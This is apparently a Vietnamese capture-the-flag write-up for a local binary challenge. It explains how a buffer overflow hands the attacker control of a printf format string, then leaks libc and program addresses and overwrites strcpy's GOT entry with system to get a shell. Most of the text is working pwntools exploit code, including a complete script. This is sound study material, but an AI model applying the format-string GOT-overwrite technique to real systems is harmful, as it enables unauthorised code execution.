# Phân tích code

<img width="775" height="178" alt="image" src="https://github.com/user-attachments/assets/67f12b4b-05f4-4641-b818-90d3d465e1f8" />
<img width="732" height="337" alt="image" src="https://github.com/user-attachments/assets/b1d3d113-76ec-4b58-bd6c-39b27a78095c" />
<img width="746" height="380" alt="image" src="https://github.com/user-attachments/assets/4db83061-0ca1-4a4c-81e7-02a757a0b63b" />

- Option 1 cho phép nhập dữ liệu tối đa 199 BYTES vào mảng s chứa được 200 BYTES. 
- Option 2 copy dữ liệu vừa nhập vào biến `v7` chỉ có sức chứa 50 BYTES, tạo ra lỗ hổng *buffer overflow*. 
- Option 3 dùng `printf` in dữ liệu với format là `v8` và buffer là `v8`. Vì ta có thể ghi đè `v8` qua lỗ hổng *buffer overflow* nên có thể kiểm soát hoàn toàn format, tạo ra thêm lỗ hổng *format string*

# Mitigation
<img width="815" height="233" alt="image" src="https://github.com/user-attachments/assets/ae73d1c7-e054-4610-aa9c-c8b834abc114" />

## Khai thác
Vì trong chương trình, ta bị kẹt trong vòng lặp while nên ghi đè ret address cũng không thể tạo shell. Cần ghi đè địa chỉ GOT của 1 hàm trong
vòng lặp bằng hàm `system`.

<img width="951" height="326" alt="image" src="https://github.com/user-attachments/assets/63a6a59a-867a-4ed1-9d4b-2453c67e254b" />
<img width="637" height="157" alt="image" src="https://github.com/user-attachments/assets/e3852900-de99-460c-85a9-2c976b7f0750" />

Trong chương trình, hàm `strcpy` có tham số đầu tiên mà ta có thể điều khiển và đưa chuỗi `/bin/sh\0` vào.

## Leak exe, libc

<img width="1412" height="441" alt="Screenshot 2026-11-25 155415" src="https://github.com/user-attachments/assets/dce4939e-bb51-499e-bcff-09c2490aef3a" />

Địa chỉ libc nằm ở % thứ 45

Nhập vào buffer vừa đúng 50 BYTES rồi đưa thêm format `%45$p` để leak 8 BYTE tại % thứ 45 được chỉ định.

    payload=b'A'*50
    payload+=b'%45$p'
    p.sendline(b'1')
    p.sendafter(b'read:',payload)
    p.sendlineafter(b'>',b'2')
    p.sendlineafter(b'>',b'3')
    p.sendlineafter(b'>',b'3')
    
    p.recvuntil(b'printing ... \n')
    libc_leak=int(p.recvuntil(b'>',drop=True),16) 
    libc.address=libc_leak-0x2a1ca
    print(hex(libc.address))

<img width="1367" height="342" alt="image" src="https://github.com/user-attachments/assets/3c6984ba-3c25-46d7-bea8-c4e036063c58" />

Địa chỉ exe nằm ở % thứ 49.

    payload=b'A'*50
    payload+=b'%49$p'
    p.sendline(b'1')
    p.sendafter(b'read:',payload)
    p.sendlineafter(b'>',b'2')
    p.sendlineafter(b'>',b'3')
    p.sendlineafter(b'>',b'3')
    
    p.recvuntil(b'printing ... \n')
    exe_leak=int(p.recvuntil(b'>',drop=True),16) 
    exe.address=exe_leak-0x11a9
    print(hex(exe.address))

## GOT Overwrite
<img width="1111" height="280" alt="Screenshot 2026-11-25 160647" src="https://github.com/user-attachments/assets/d8eb108a-df55-49cb-afe6-295b2f78dfdf" />

Hàm `strcpy` và `system` chỉ khác nhau 3 BYTES. Chỉ cần ghi đè từng BYTE vào qua `%hhn`.

Chuẩn bị dữ liệu nhập vào:

    strcpy_got=exe.address+0x4000
    system_libc=libc.sym['system']
    
    data={          
        (system_libc>>0)&0xff:strcpy_got,    
        (system_libc>>8)&0xff:strcpy_got+1,
        (system_libc>>16)&0xff:strcpy_got+2,
    }    
    //Các BYTE của system và địa chỉ sctrpy cần ghi đè
    
    order=sorted(data)
    //sắp xếp kích thước bé đến lớn

<br>

Sau đó đưa format vào rồi gọi `printf` để ghi đè `system`. Đồng thời để chuỗi `/bin/sh` ở đầu buffer làm tham số thứ nhất cho `system`.

    payload=b'/bin/sh;'
    payload=payload.ljust(50,b'A')
    payload+=f'%{order[0]}c%19$hhn'.encode()
    payload+=f'%{order[1]-order[0]}c%20$hhn'.encode()
    payload+=f'%{order[2]-order[1]}c%21$hhn'.encode()
    payload=payload.ljust(88,b'A')
    payload+=flat(
        data[order[0]],
        data[order[1]],
        data[order[2]],
    )
    p.sendline(b'1')
    p.sendafter(b'read:',payload)
    p.sendlineafter(b'>',b'2')
    p.sendlineafter(b'>',b'3')
    p.sendlineafter(b'>',b'3')    //format string
    
    p.sendline(b'2')              //gọi strcpy
    
# Script python

    #!/usr/bin/env python3
    from pwn import *
    exe = ELF("./chall_patched",checksec=False)
    libc = ELF("./libc.so.6",checksec=False)
    ld = ELF("./ld-linux-x86-64.so.2",checksec=False)
    context.binary = exe
    p=process(exe.path)
    
    payload=b'A'*50
    payload+=b'%45$p'
    p.sendline(b'1')
    p.sendafter(b'read:',payload)
    p.sendlineafter(b'>',b'2')
    p.sendlineafter(b'>',b'3')
    p.sendlineafter(b'>',b'3')
    p.recvuntil(b'printing ... \n')
    libc_leak=int(p.recvuntil(b'>',drop=True),16)
    libc.address=libc_leak-0x2a1ca
    print(hex(libc.address))
    
    payload=b'A'*50
    payload+=b'%49$p'
    p.sendline(b'1')
    p.sendafter(b'read:',payload)
    p.sendlineafter(b'>',b'2')
    p.sendlineafter(b'>',b'3')
    p.sendlineafter(b'>',b'3')
    p.recvuntil(b'printing ... \n')
    exe_leak=int(p.recvuntil(b'>',drop=True),16)
    exe.address=exe_leak-0x11a9
    print(hex(exe.address))
    
    strcpy_got=exe.address+0x4000
    system_libc=libc.sym['system']
    
    data={
        (system_libc>>0)&0xff:strcpy_got,
        (system_libc>>8)&0xff:strcpy_got+1,
        (system_libc>>16)&0xff:strcpy_got+2,
    }
    order=sorted(data)
    
    payload=b'/bin/sh;'
    payload=payload.ljust(50,b'A')
    payload+=f'%{order[0]}c%19$hhn'.encode()
    payload+=f'%{order[1]-order[0]}c%20$hhn'.encode()
    payload+=f'%{order[2]-order[1]}c%21$hhn'.encode()
    payload=payload.ljust(88,b'A')
    payload+=flat(
        data[order[0]],
        data[order[1]],
        data[order[2]],
    )
    p.sendline(b'1')
    p.sendafter(b'read:',payload)
    p.sendlineafter(b'>',b'2')
    p.sendlineafter(b'>',b'3')
    p.sendlineafter(b'>',b'3')
    
    p.sendline(b'2')
    
    p.interactive()

